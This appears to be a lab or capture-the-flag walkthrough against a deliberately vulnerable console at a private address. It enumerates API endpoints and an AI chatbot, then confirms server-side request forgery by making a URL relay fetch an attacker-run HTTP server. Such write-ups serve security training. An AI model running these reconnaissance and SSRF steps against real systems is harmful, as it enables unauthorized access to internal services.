## 🔬 Step 1 — Identify the web application

First, inspect the target's homepage:

```
curl -i http://10.80.133.250/
```

Result: `HTTP/1.1 200 OK`

The returned HTML identified the application as:

```
EPOCH-1 // Mo-delus Substation Console
```

It also revealed two interfaces: EPOCH-Assistant, a public-facing AI chatbot, and Subspace Telemetry Relay, a service that retrieves URLs on behalf of users.

The homepage referenced a JavaScript file:

```
<script src="/static/app.js"></script>
```

## 🔬 Step 2 — Discover the API endpoints

Inspect the JavaScript:

```
curl -s http://10.80.133.250/static/app.js
```

To locate API requests:

```
curl -s http://10.80.133.250/static/app.js \
  | grep -nE 'fetch\(|/api/|XMLHttpRequest|endpoint'
```

Result:

```
53: const r = await fetch("/api/chat", {
87: const r = await fetch("/api/telemetry", {
```

We identified two endpoints:

|Endpoint|Method|Function|
|---|---|---|
|`/api/chat`|POST|Sends messages to an AI model|
|`/api/telemetry`|POST|Fetches a user-supplied URL|

The JavaScript also contained a revealing comment:

```
// ---- Telemetry relay (SSRF-prone by design) ----
```

This suggested that the telemetry relay was worth investigating.

## 🔬 Step 3 — Confirm the public AI model

Retrieve the publicly advertised models:

```
curl -s http://10.80.133.250/api/models | jq .
```

Result:

```
{
  "models": [
    {
      "id": "epoch-assistant",
      "label": "EPOCH-Assistant v1 (general ops)"
    }
  ]
}
```

The public API advertised only one model: `epoch-assistant`.

We also confirmed that the chat endpoint was functional:

```
curl -sS -X POST "http://10.80.133.250/api/chat" \
  -H "Content-Type: application/json" \
  -d '{
    "model": "epoch-assistant",
    "message": "Identify yourself and explain your operational responsibilities."
  }' | jq .
```

The agent identified itself as the EPOCH-1 bridge AI responsible for logistics and mission assistance.

## 🔬 Step 4 — Investigate SSRF

The telemetry endpoint accepts a URL in JSON:

```
curl -sS -X POST "http://10.80.133.250/api/telemetry" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://10.80.133.250/"}' | jq .
```

Result: The relay returned the application's HTML with status `200`.

This showed that the backend fetches the supplied URL and returns the response body.

We then tested the relay against an HTTP server under our control.

Start a server on the attacker machine:

```
mkdir -p /tmp/relay-test
echo "RELAY_TEST_SUCCESS" > /tmp/relay-test/index.html

cd /tmp/relay-test
python3 -m http.server 8080 --bind 0.0.0.0
```

From a separate terminal:

```
curl -sS -X POST "http://10.80.133.250/api/telemetry" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://10.80.179.169:8080/"}' | jq .
```

Observed result:

```
{
  "body": "RELAY_TEST_SUCCESS\n",
  "content_type": "text/html",
  "status": 200,
  "url": "http://10.80.179.169:8080/"
}
```

This confirmed that the target server performs HTTP requests to attacker-supplied destinations and exposes their responses.
